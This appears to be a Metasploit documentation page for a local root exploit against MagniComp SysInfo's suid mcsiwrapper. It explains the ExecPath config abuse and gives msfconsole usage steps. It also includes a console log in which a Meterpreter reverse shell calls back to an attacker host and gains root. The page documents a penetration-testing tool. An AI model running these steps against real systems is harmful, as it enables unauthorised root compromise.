{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc","result":{"data":{"moduleMetadataJson":{"id":"927ceecf-ad77-5b43-8789-4ea9e2edd647","name":"MagniComp SysInfo mcsiwrapper Privilege Escalation","fullname":"exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc","description":"This module attempts to gain root privileges on systems running\n        MagniComp SysInfo versions prior to 10-H64.\n\n        The .mcsiwrapper suid executable allows loading a config file using the\n        '--configfile' argument. The 'ExecPath' config directive is used to set\n        the executable load path. This module abuses this functionality to set\n        the load path resulting in execution of arbitrary code as root.\n\n        This module has been tested successfully with SysInfo version\n        10-H63 on Fedora 20 x86_64, 10-H32 on Fedora 27 x86_64, 10-H10 on\n        Debian 8 x86_64, and 10-GA on Solaris 10u11 x86.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc","documentationSlug":"/modules/documentation/exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc","referencesSlug":"/modules/references/exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>  This module attempts to gain root privileges on systems running MagniComp SysInfo versions prior to 10-H64.</p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  <a href=\"https://www.magnicomp.com/sysinfo/\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">MagniComp SysInfo</a> is a single system agent and viewer providing extensive IT asset inventory and configuration information for most major Linux, UNIX, Apple Macintosh, and Microsoft Windows platforms as well as leading NAS and SAN Storage Systems and logical volume software solutions.</p>\n<p>  The <code class=\"language-text\">.mcsiwrapper</code> suid executable allows loading a config file using the <code class=\"language-text\">--configfile</code> argument. The <code class=\"language-text\">ExecPath</code> config directive is used to set the executable load path. This module abuses this functionality to set the load path resulting in execution of arbitrary code as root.</p>\n<p>  This module has been tested successfully on SysInfo:</p>\n<ul>\n<li>10-GA on Solaris 10u11 x86</li>\n<li>10-H10 on Debian 8 x86_64</li>\n<li>10-H32 on Fedora 27 x86_64</li>\n<li>10-H63 on Fedora 20 x86_64</li>\n</ul>\n<p>  Installers:</p>\n<ul>\n<li><a href=\"https://www.magnicomp.com/cgi-bin/mcdownload.cgi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.magnicomp.com/cgi-bin/mcdownload.cgi</a></li>\n<li><a href=\"https://www.magnicomp.com/cgi-bin/mcdownload.cgi/Action=ListDDF\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">https://www.magnicomp.com/cgi-bin/mcdownload.cgi/Action=ListDDF</a></li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li>Get a session</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc</code></li>\n<li>Do: <code class=\"language-text\">set SESSION [SESSION]</code></li>\n<li>Do: <code class=\"language-text\">check</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>You should get a new <em>root</em> session</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>SESSION</strong></p>\n<p>  Which session to use, which can be viewed with <code class=\"language-text\">sessions</code></p>\n<p>  <strong>SYSINFO_DIR</strong></p>\n<p>  Path to SysInfo directory (default: <code class=\"language-text\">/opt/sysinfo</code>)</p>\n<p>  <strong>WritableDir</strong></p>\n<p>  A writable directory file system path. (default: <code class=\"language-text\">/tmp</code>)</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc \nmsf exploit(multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc) &gt; set session 1\nsession =&gt; 1\nmsf exploit(multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc) &gt; run\n\n[*] Started reverse TCP handler on 172.16.191.244:4444 \n[*] Using target: Linux\n[*] Writing &#39;/tmp/.0rk4PC/vFdxxuBVkh&#39; (21 bytes) ...\n[*] Writing &#39;/tmp/.0rk4PC/eoGVzYwGa&#39; (207 bytes) ...\n[*] Executing payload...\n[*] Sending stage (857352 bytes) to 172.16.191.137\n[*] Meterpreter session 2 opened (172.16.191.244:4444 -&gt; 172.16.191.137:42229) at 2018-02-05 07:38:35 -0500\n[+] Deleted /tmp/.0rk4PC/vFdxxuBVkh\n[+] Deleted /tmp/.0rk4PC/eoGVzYwGa\n[+] Deleted /tmp/.0rk4PC\n\nmeterpreter &gt; getuid\nServer username: uid=0, gid=1000, euid=1000, egid=1000\nmeterpreter &gt; sysinfo\nComputer     : localhost.localdomain\nOS           : Fedora 20 (Linux 3.19.8-100.fc20.x86_64)\nArchitecture : x64\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"927ceecf-ad77-5b43-8789-4ea9e2edd647"}}}